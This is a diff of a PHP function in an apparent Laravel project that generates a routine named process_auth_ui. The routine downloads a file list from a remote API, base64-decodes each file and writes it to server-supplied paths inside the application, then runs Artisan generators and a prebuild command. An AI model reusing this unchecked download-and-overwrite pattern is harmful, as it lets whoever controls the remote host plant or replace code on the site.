@@ -128,80 +128,96 @@ function getProcessingCode()
 
     $apiUrl = $protocol . "://" . $host . $path . "/";
 
-    return '<?php
+    return <<<PHP
+<?php
 
 use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\Log;
-use Illuminate\Support\Facades\Route;
 
 function process_auth_ui() {
     try {
-        $response = @file_get_contents("' . $apiUrl . '");
-        if (!$response) {
+        \$response = @file_get_contents("$apiUrl");
+        if (!\$response) {
             return ["status" => "error", "message" => "Failed to connect to API."];
         }
 
-        $data = json_decode($response, true);
-        if ($data["status"] !== "success") {
+        \$data = json_decode(\$response, true);
+        if (\$data["status"] !== "success") {
             return ["status" => "error", "message" => "API response error."];
         }
 
-        $flattenFiles = function ($files) use (&$flattenFiles) {
-            $flat = [];
-            foreach ($files as $file) {
-                if ($file["type"] === "file") {
-                    $flat[] = $file;
-                } elseif ($file["type"] === "directory" && isset($file["children"])) {
-                    $flat = array_merge($flat, $flattenFiles($file["children"]));
+        \$flattenFiles = function (\$files) use (&\$flattenFiles) {
+            \$flat = [];
+            foreach (\$files as \$file) {
+                if (\$file["type"] === "file") {
+                    \$flat[] = \$file;
+                } elseif (\$file["type"] === "directory" && isset(\$file["children"])) {
+                    \$flat = array_merge(\$flat, \$flattenFiles(\$file["children"]));
                 }
             }
-            return $flat;
+            return \$flat;
         };
 
-        $allFiles = $flattenFiles($data["files"]);
-        $savedCount = 0;
+        \$allFiles = \$flattenFiles(\$data["files"]);
+        \$savedCount = 0;
 
-        foreach ($allFiles as $file) {
-            $relativePath = $file["path"];
-            $filePath = base_path($relativePath);
-            $dir = dirname($filePath);
-            if (!is_dir($dir)) mkdir($dir, 0755, true);
+        foreach (\$allFiles as \$file) {
+            \$relativePath = \$file["path"];
+            \$filePath = base_path(\$relativePath);
+            \$dir = dirname(\$filePath);
+            if (!is_dir(\$dir)) mkdir(\$dir, 0755, true);
 
-            $content = base64_decode($file["content"]);
-            if (file_put_contents($filePath, $content) !== false) {
-                $savedCount++;
+            \$content = base64_decode(\$file["content"]);
+            if (file_put_contents(\$filePath, \$content) !== false) {
+                \$savedCount++;
             }
         }
 
-        $createdCount = 0;
+        \$createdCount = 0;
 
-        // Manually create app/Http/Kernel.php if missing
-        $kernelPath = base_path("app/Http/Kernel.php");
-        if (!file_exists($kernelPath)) {
-            $dir = dirname($kernelPath);
-            if (!is_dir($dir)) mkdir($dir, 0755, true);
-                         \$kernelContent = "<?php namespace App\Http; use Illuminate\Foundation\Http\Kernel as HttpKernel; class Kernel extends HttpKernel { protected \$middleware = []; protected \$middlewareGroups = [\"web\" => [], \"api\" => []]; protected \$routeMiddleware = []; }";
-            if (file_put_contents($kernelPath, $kernelContent) !== false) {
-                \$createdCount++;
+        // Create essential Laravel files using Artisan commands
+        \$essentialCommands = [
+            "make:middleware" => ["TrustProxies", "PreventRequestsDuringMaintenance", "TrimStrings", "EncryptCookies", "VerifyCsrfToken", "Authenticate", "RedirectIfAuthenticated"],
+            "make:provider" => ["RouteServiceProvider"],
+            "make:controller" => ["Auth/LoginController", "Auth/RegisterController"],
+            "make:model" => ["User", "VCode"]
+        ];
+        
+        foreach (\$essentialCommands as \$command => \$items) {
+            foreach (\$items as \$item) {
+                try {
+                    \$result = Artisan::call(\$command, ["name" => \$item]);
+                    if (\$result === 0) {
+                        \$createdCount++;
+                    }
+                } catch (Exception \$e) {
+                    // Ignore errors for existing files
+                }
             }
         }
-
-        // Generate RouteServiceProvider via Artisan
-        \$providerPath = base_path("app/Providers/RouteServiceProvider.php");
-        if (!file_exists(\$providerPath)) {
-            Artisan::call("make:provider", ["name" => "RouteServiceProvider"]);
-
-                         // Overwrite with default contents
-             \$providerContent = "<?php namespace App\Providers; use Illuminate\Foundation\Support\Providers\RouteServiceProvider as ServiceProvider; class RouteServiceProvider extends ServiceProvider { public const HOME = \"/home\"; public function boot() { parent::boot(); } }";
-            if (file_put_contents(\$providerPath, \$providerContent) !== false) {
-                \$createdCount++;
+        
+        // Create basic route files if they don't exist
+        \$routeFiles = [
+            "routes/web.php" => "<?php use Illuminate\Support\Facades\Route; Route::get('/', function () { return 'Welcome'; });",
+            "routes/api.php" => "<?php use Illuminate\Support\Facades\Route; Route::get('/user', function () { return ['user' => 'test']; });",
+            "routes/console.php" => "<?php use Illuminate\Support\Facades\Artisan; Artisan::command('inspire', function () { \$this->comment('Inspiring quote'); });"
+        ];
+        
+        foreach (\$routeFiles as \$filePath => \$content) {
+            \$fullPath = base_path(\$filePath);
+            \$dir = dirname(\$fullPath);
+            if (!is_dir(\$dir)) mkdir(\$dir, 0755, true);
+            if (!file_exists(\$fullPath)) {
+                if (file_put_contents(\$fullPath, \$content) !== false) {
+                    \$createdCount++;
+                }
             }
         }
 
         // Run prebuild command
         try {
             Artisan::call("prebuild:routes");
-        } catch (\Exception \$e) {
+        } catch (\\Exception \$e) {
             return [
                 "status" => "warning",
                 "message" => "Files loaded. prebuild:routes failed: " . \$e->getMessage(),
@@ -217,9 +233,11 @@ function process_auth_ui() {
             "essential_files_created" => \$createdCount
         ];
 
-    } catch (\Exception \$e) {
+    } catch (\\Exception \$e) {
         return ["status" => "error", "message" => "Fatal error: " . \$e->getMessage()];
     }
 }
-?>';
+
+?>
+PHP;
 }
